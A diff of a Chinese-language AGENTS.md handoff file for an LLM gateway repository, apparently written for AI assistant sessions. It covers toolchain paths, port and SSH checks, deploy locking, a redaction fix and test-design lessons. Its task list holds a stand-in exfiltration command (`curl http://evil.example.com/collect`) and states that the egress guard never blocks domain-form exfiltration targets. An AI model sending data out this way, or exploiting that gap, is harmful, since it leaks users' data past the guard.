@@ -1,25 +1,110 @@
 # llm-gateway-go — AGENTS.md（维护者交接）
 
 > 适用：未来任何 cold-start 切到本仓库的助手会话（不区分会话身份）。
-> 写入时机：2026-10-09，由 root 会话 `mvs_b293ccc3be3343b9aa3fcdb0c41c1706` 在环境工具链缺失下生成。
-> 上下文：本轮完成与 `origin/main` 的合并、冲突解决、修复提交推送与软链 SSOT 迁移。剩余的编译验证 / lite 冒烟 / 真库回归 / deploy-local 全链路验证因本机 `go` / `brew` / `docker` / Postgres / Redis 全部缺失未能完成，按以下任务清单继续。
+> 写入时机：2026-10-09 首次生成；**2026-10-11 由 root 会话
+> `mvs_d10f8ded3e7c4d73b8221fe670ddd9dc` 重写「工具链」与「已落地结论」两节**，
+> 原文件关于「go/brew/docker 全部缺失」的判断已被实测推翻，见下。
+> 上下文：脱敏范围事故（地址被遮蔽成 `[REDACTED]`）的修复、245 部署验证与
+> 随后的批判性审计。
 
 ## 仓库快照
 
-- 路径：`/Users/huangxt/workspace/llm-gateway-go`
+- 路径：`/Users/niuer/workspace/ai-native-tools/llm-gateway/llm-gateway-go-cursor`
+  （本机为独立 checkout；`/Users/niuer/workspace/ai-native-tools/llm-gateway/llm-gateway-go`
+  是**另一份并发 checkout**，两边同时 deploy 会互相抢 245 的部署锁）
 - 远端：codeup.aliyun.com（`origin/main`）
-- HEAD：`7817f1c1a`（审计 pass：第二十节结论 + 第九之二节更正）→ `7dd0b4b67`（sanitize 五项修复）→ `e3e2b4ef`（migration 849 `SET LOCAL statement_timeout`）→ `d44a29f77`（web-mobile lockfile）→ `558953c52`（bash 3.2 兼容）→ `2bf5b3870`（deploy-seamless 依赖安装判据）
-- 分支：仅 `main`；仓库多会话共享且推送频繁，提交前先 `git fetch && git status -sb` 避免覆盖他人改动
+- HEAD：见 `git log --oneline -1`。**不要照抄本文件的 commit 列表**——仓库多会话共享，
+  本文件记录时点之后通常已有他人提交；以 `git log` 为准。
+- 分支：仅 `main`；提交前先 `git fetch && git status -sb`
 - Go 模块：见仓库根 `go.mod`
-- 入口二进制：`cmd/gateway/main.go`（v1，`:8781`）、`cmd/gateway-v2/main.go`（v2，`:8782`，独立）
+- 入口二进制：`cmd/gateway/main.go`（v1）、`cmd/gateway-v2/main.go`（v2，独立）
 
-> **端口以部署现场为准，不要照抄本文件的默认值。** 两台机器都用蓝绿部署，
-> 实际监听端口由 `/opt/llm-gateway-go/run/active-upstream.conf` 决定，
-> nginx 通过 `upstream llm_local { include … }` 引用它。
-> 2026-10-10 实测：**154 与 245 均运行在 `:8782`**，`slots/` 下只有 `8782 ->` 一个软链。
-> 探活前先读该文件确认端口，不要假定 8781 还在监听——直连 `127.0.0.1:8781` 会
-> 得到 connection refused，看起来像故障，实际服务健康。
-> 经 nginx 的 `curl http://127.0.0.1/healthz` 是与部署形态一致的探活方式。
+## 本机工具链（2026-10-11 实测，原「全部缺失」的结论已作废）
+
+| 工具 | 状态 | 说明 |
+|---|---|---|
+| `go` | `~/sdk/go/bin/go` 1.27.1 | **不在 PATH 上**，跑任何 go 命令前 `export PATH="$HOME/sdk/go/bin:$PATH"` |
+| `bash` ≥4 | `~/sdk/bash5/bin/bash` 5.2.0 | 系统只有 3.2，deploy-lib 用到 `${var^^}`（bash 4+）必须用这个 |
+| `pnpm` | `corepack prepare pnpm@10.29.2` | 仓库 `packageManager` 锁 10.29.2 |
+| `node` | nvm 22.23.3 | 在 PATH 上 |
+| `brew` / `docker` | **确实缺失** | 真库回归（full 模式）仍做不了 |
+| `psql` | 有 | 可直连生产 DSN 做只读查询 |
+
+> bash 5.2 若需重编：`~/sdk/bashbuild/bash-5.2`。构建时
+> `builtins/psize.sh` 的 `mktemp` 会被沙箱 wrapper 污染，生成物 `pipesize.h`
+> 会混入 `mavis-trash:` 字样导致编译失败（`unknown type name 'mavis'`）。
+> 已把该脚本改为直接输出固定值 `PIPESIZE 65536`。重编时注意这一点。
+
+## 端口：必须现场确认，不要假设
+
+两台机器都是蓝绿部署，监听端口由 `/opt/llm-gateway-go/run/active-upstream.conf`
+决定，nginx 用 `upstream llm_local { include … }` 引用。
+
+- 2026-10-10 实测：154 与 245 均在 `:8782`。
+- 2026-10-11 实测：**245 的活跃端口漂到了 `:8782`**（deploy handoff 输出
+  `active_port=8782`），`:8781` 无监听。部署期间发生过与另一份 checkout 的并发部署。
+
+探活一律两个端口都试：`curl -s http://127.0.0.1:{8781,8782}/readyz`。
+直连 8781 得到 connection refused **不代表故障**，只代表端口没在用。
+
+## SSH：必须走别名，不能用裸 IP
+
+`~/.ssh/config` 里 `245` / `154` / `252` 都配了 **`Port 25022`**。
+用 `ssh root@8.136.114.245`（裸 IP）会走 22 端口并被对端在 KEX 阶段断开，
+表现为 `Connection closed by ... port 22` —— 看起来像目标机挂了，实际是端口错了。
+**一律用 `ssh 245` / `ssh 154` / `ssh 252`。**
+
+## 本轮已落地：脱敏范围事故
+
+用户报告会话里出现 `export https_proxy=http://[REDACTED]:7890`。分析发现是
+**三条互相独立的遮蔽链路各自在遮地址**，只修一条不够：
+
+1. `security/sanitize` 的 `server_ip`/`internal_ip` —— 一条规则同时承担
+   「替换请求文本敏感值」与「判定模型是否外传」两个职责。已引入
+   `DetectionScope` 拆分：`ScopeRedact`（默认，不含地址）/ `ScopeEgress`
+   （仅 tool 参数防外传守卫用）。
+2. `pii_patterns.ip_address` —— 316 迁移播种的 DB 规则，正则宽到连环回与
+   版本号一并命中。已由 **851 迁移**停用（UPDATE 非 DELETE：316 是幂等播种，
+   删行会被重放种回来）。
+3. `domains/outputcompliance` 的 `detectInternalIP` 默认动作 redact。
+   已改为 `log`：**只撤遮蔽、不撤检出**，审计台账仍看得到命中。
+
+遮蔽标记同步改为带类型：`[REDACTED:phone]` / `[REDACTED:secret]`。
+
+分析与变异验证详见 `docs/audit/2026-10-10-脱敏范围与遮蔽标记.md`。
+
+## 判据设计的硬教训（本轮最贵的两条）
+
+1. **判据必须与被测函数在同一层。** r1014 第一版把断言写在 SSE 流式链上，
+   对核心逻辑的极端变异（豁免恒 false / 恒 true）**0 条失败** —— 全绿但无效。
+   改判据时又把 `arguments` 写成 JSON 对象而非 JSON 字符串字面量，整帧非法
+   JSON、守卫压根走不到检查，公网用例反而全绿。改用 `unsafeToolValue`
+   直接驱动守卫判定入口后才可信。
+2. **用内置 `NewPatternDetector()` 写的地址类判据一律是假绿。** fallback 的
+   `defaultPatternEntries` 里**没有任何地址规则**，所以这类判据不可能失败。
+   地址相关判据必须用 `NewPatternDetectorFromFile("../../configs/sensitive_patterns.yaml")`。
+   r1010 那条就是这么漏掉了私网阻断的真实缺陷（dc63f19ff 修复）。
+3. **「没被阻断」有两种成因，必须把「看不见」单独判掉。** 允许侧用例绿，可能是
+   （a）命中豁免放行，也可能是（b）检测器压根没匹配到该地址。b 是假绿，且
+   **变异验证也测不出来**（因为它没有改逻辑，只改了「看不见的范围」）。
+   2026-10-11 实测：把 `server_ip` 正则收窄成只匹配 `127.*` 后，
+   `TestR1014NonExfiltrationAddressesAreNotBlocked` **依然全绿**，
+   而新增的 `TestR1014AllowedAddressesAreActuallyDetected` 红了 7 条。
+   凡是有「允许侧」判据，都配一条「前提仍在场」的断言。
+4. **证明「既有失败与我无关」有两种强度，别混着用。** 强：`git worktree add` 到
+   pristine HEAD 复跑（admin 3 条用的是这个）；弱：`go list -deps` 确认目标包
+   不依赖被改包（`domains/hooks/handoff` 的 `Test244WideningRuleShrinksGap`
+   用的是这个——它不依赖 `security/sanitize`，所以我的改动在因果上不可能影响它）。
+
+写完判据后**必须做变异验证**（把被测逻辑改坏，确认判据变红），否则不知道它
+是否真的在测东西。
+
+## 剩余任务
+
+- **154 生产未部署本次改动**：`configs/sensitive_patterns.yaml` 与 851 迁移
+  会随部署生效，但 154 的 `pii_patterns` 是独立库，迁移需单独执行。
+- **域名形式的外传目标从不被拦**（`curl http://evil.example.com/collect`
+  不触发阻断）：`ScopeEgress` 只匹配 IP 规则。先于本次改动存在，未处理。
 
 ## 已完成（已推送）
 
@@ -33,32 +118,42 @@
 
 ### 任务 1 — 编译 / vet / gofmt / 单元测试
 
-**前置**：安装 Go（项目 `go.mod` 指定版本，常见 1.22+）。
-
-**命令**（先 `export PATH="$HOME/sdk/go/bin:$PATH"`，见任务 2 的工具链提示）：
+**前置**：`export PATH="$HOME/sdk/go/bin:$PATH"`（Go 1.27.1 已就位，无需安装）。
 
 ```bash
 go build ./...
 go vet ./...
-gofmt -l .                                # 无输出即过
+gofmt -l <你改的文件>                    # 无输出即过
 CGO_ENABLED=0 go test \
-  ./admin/... ./bg/... ./domains-stats/... ./settings/...
+  ./security/... ./domains/outputcompliance/... ./domains/streaming/... \
+  ./proxy/... ./settings/...
 ```
 
-> **`gofmt -l .` 目前输出 376 个文件，这是上游长期存量，不是你的回归。**
-> 2026-10-10 审计实测：`go build ./...` rc=0、`go vet ./...` 零告警，
-> 而 `gofmt -l .` 有 376 个未格式化文件。**不要顺手全量格式化**——
-> 那会产生巨型 diff 并在多会话共享仓库里制造冲突面。只保证你本次改动的
-> `.go` 文件已格式化（提交前跑 `gofmt -l <你改的文件>`）。
+> **注意**：原文档写的 `./domains-stats/...` 在本仓库**不存在**
+> （`lstat ./domains-stats/: no such file or directory`），别照抄。
+>
+> **`gofmt -l .` 有大量存量未格式化文件，这是上游长期状态，不是你的回归。**
+> 不要全量格式化——巨型 diff 会在多会话共享仓库里制造冲突面。
+>
+> **已知失败（与改动无关，先在 pristine `origin/main` 上复现再判定）**：
+> `admin` 的 `TestV1BodiesReadersAreAssessed`（维护者故意红的负向闸门，判据是
+> 「登记表覆盖全部 bodies 读方」）、`TestHandleUsersPasswordRoute_Rejects*`
+> （2 条）、`domains/hooks/handoff` 的 `Test244WideningRuleShrinksGap`。
+> 2026-10-11 在 pristine origin/main 上实测这 4 条**一模一样地红**。
+> `verify.sh` 在 `set -e` 下无条件 `go test ./...`，因此主门长期为红是
+> 维护者策略，不要改 CI 或加白名单。
 
-**已验证绿的子集**（2026-10-10 审计，`go test ./security/... ./domains/streaming/...`，rc=0）：
+**已验证绿的子集**（2026-10-11 审计实测，`CGO_ENABLED=0 go test`，rc=0）：
 
 | 包 | 耗时 |
 |---|---|
-| `security/sanitize` | 5.2s |
-| `domains/streaming` | 167.4s |
-| `domains/streaming/executors` | 50.1s |
-| `security/armor` `guardian` `sensitive`、`streaming/{integrity,state,executors/webcookie}` | ok |
+| `security/sanitize` | ~5s |
+| `security/armor` `guardian` `sensitive` | ok |
+| `domains/outputcompliance` | ~0.5s |
+| `domains/streaming` | ~168s |
+| `domains/streaming/executors` | ~51s |
+| `proxy` / `settings` | ok |
+| `domains/streaming/{integrity,state,executors/webcookie}` | ok |
 
 sanitize / streaming 这条线在当前 HEAD 是全绿的，可直接作为改动后的回归门。
 
@@ -68,7 +163,10 @@ sanitize / streaming 这条线在当前 HEAD 是全绿的，可直接作为改�
 
 **主门长期红的原因与对策**：
 
-- `verify.sh:51` 在 `set -e` 下无条件 `go test ./...`；CI 上 `verify-ci.yml` 未对主作业加 `continue-on-error`。在故意红的负向闸门下，主门长期为红。这是**维护者策略**，不是回归，不要主动改 CI 或加白名单；任务 1 走的是子集 `./admin/... ./bg/... ./domains-stats/... ./settings/...`，可在不上 CI 的情况下给出"非负向闸门子集全绿"的事实。
+- `verify.sh` 在 `set -e` 下无条件 `go test ./...`；CI 上 `verify-ci.yml` 未对主作业
+  加 `continue-on-error`。在故意红的负向闸门下，主门长期为红。这是**维护者策略**，
+  不是回归，不要主动改 CI 或加白名单；任务 1 走的是上面那个子集，可在不上 CI 的
+  情况下给出「非负向闸门子集全绿」的事实。
 
 ### 任务 2 — lite 模式本地冒烟（最低门槛）
 
@@ -147,3 +245,38 @@ bash tests/deploy_timeout_portability_test.sh
 ```
 
 期望 `rc=0`；失败即 deploy-lib 出现了裸 `timeout` 调用或未走 `_dl_timeout` 封装。
+
+## 部署 245 的实操（2026-10-11 全程走通）
+
+```bash
+export PATH="$HOME/sdk/bash5/bin:$HOME/sdk/go/bin:$HOME/.nvm/versions/node/v22.23.3/bin:$PATH"
+export AIAN_DEPLOY_LIB="$HOME/workspace/ai-native-tools/deploy-lib"   # 见下方 SSOT 说明
+cd <本 checkout>
+bash scripts/deploy-245.sh --seq <seq>          # seq 必须自增且不与他人撞
+```
+
+踩过的坑：
+
+1. **系统 bash 3.2 跑不了 deploy-lib**（`${target^^}` 是 bash 4+ 语法，报
+   `bad substitution`）。必须用 `~/sdk/bash5/bin/bash`。
+2. **前端要自己先构建**：`web/dist` 与 `web-mobile/dist` 缺失时 deploy 会
+   refuse。先 `corepack prepare pnpm@10.29.2 --activate`，再在两个前端目录
+   各跑 `pnpm install --frozen-lockfile && pnpm build`。
+3. **`scripts/deploy-lib` 是相对软链**，在本 checkout 里指向
+   `../../ai-native-workspace/deploy-lib`（**不存在**），实际 SSOT 在
+   `~/workspace/ai-native-tools/deploy-lib`。要么 `export AIAN_DEPLOY_LIB=...`
+   指过去，要么用 `scripts/deploy-lib-resolve.sh`。
+4. **部署锁会与并发 checkout 抢**：`/tmp/kx-llm-gateway-deploy-245.lock`。
+   锁元数据里能看到持有者 pid 与 checkout 来源。**别用 `--force` 硬抢**——
+   等待即可（实测等待约 3 分钟后对方完成）。硬抢会打断对方的蓝绿切换，
+   留下一半状态（245 的 8781 曾因此掉线）。
+5. **部署会改脏工作区**：`VERSION`、`version.json`、`web/public/version.json`、
+   `web/public/menu-config.json`、`docs/db-changelog.md` 每次 deploy 都被改写。
+   提交前 `git checkout --` 掉它们，别把部署产物混进提交。
+6. **部署后端口可能不是 8781**：handoff 输出里的 `active_port` 才是权威值。
+
+### SSOT 软链的真实情况
+
+仓库里 `scripts/deploy-lib` 的软链目标（`ai-native-workspace/…`）与本机实际
+SSOT（`ai-native-tools/…`）不一致。**用 `AIAN_DEPLOY_LIB` 环境变量指真实路径，
+不要依赖软链。** 软链的事留给维护者裁决，不要自行改提交。
